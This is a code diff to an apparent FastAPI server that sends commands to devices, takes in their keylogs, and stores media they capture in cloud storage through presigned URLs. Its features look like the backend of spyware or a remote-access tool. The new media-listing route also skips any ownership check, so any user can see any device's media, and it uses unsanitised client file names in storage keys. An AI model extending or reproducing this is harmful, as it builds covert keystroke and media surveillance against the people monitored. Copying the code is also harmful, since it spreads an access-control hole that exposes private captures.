@@ -13,8 +13,10 @@ from app.core import security
 from app.core.auth import get_current_user, get_current_device
 security.get_current_user = get_current_user
 security.verify_device_token = get_current_device
+security.get_current_device = get_current_device
 from datetime import timedelta
 from app.core.config import settings
+from app.services import r2_service
 from sqlalchemy.sql import func
 
 router = APIRouter()
@@ -268,9 +270,25 @@ def send_command(device_id: int, command: schemas.CommandBase, db: Session = Dep
     cmd_create = schemas.CommandCreate(**command.dict(), device_id=device_id)
     return crud.create_command(db=db, command=cmd_create, user_id=current_user.id)
 
-@router.get("/devices/{device_id}/media/", response_model=List[schemas.MediaFile])
-def read_media(device_id: int, skip: int = 0, limit: int = 100, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)):
-    return crud.get_media_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
+@router.post("/media/presigned-put", response_model=schemas.PresignedPutResponse)
+def get_presigned_put(req: schemas.PresignedPutRequest, current_device: models.Device = Depends(security.get_current_device)):
+    key = f"devices/{current_device.id}/{uuid.uuid4()}_{req.file_name}"
+    url = r2_service.generate_presigned_put(key, req.file_type)
+    return {"upload_url": url, "s3_key": key}
+
+@router.post("/media/complete", response_model=schemas.MediaFileResponse)
+def complete_media_upload(req: schemas.MediaCompleteRequest, db: Session = Depends(database.get_db), current_device: models.Device = Depends(security.get_current_device)):
+    return crud.create_media_record(db, current_device.id, req.s3_key, req.file_name, req.file_size, req.captured_at)
+
+@router.get("/devices/{device_id}/media", response_model=List[schemas.MediaFileResponse])
+def list_device_media(device_id: int, db: Session = Depends(database.get_db), current_user: models.User = Depends(security.get_current_user)):
+    items = crud.get_media_by_device(db, device_id)
+    res = []
+    for m in items:
+        m_dict = schemas.MediaFileResponse.from_orm(m)
+        m_dict.url = r2_service.generate_presigned_get(m.s3_key)
+        res.append(m_dict)
+    return res
 
 @router.post("/devices/me/keylogs/", response_model=schemas.Keylog)
 def create_keylog_for_device(
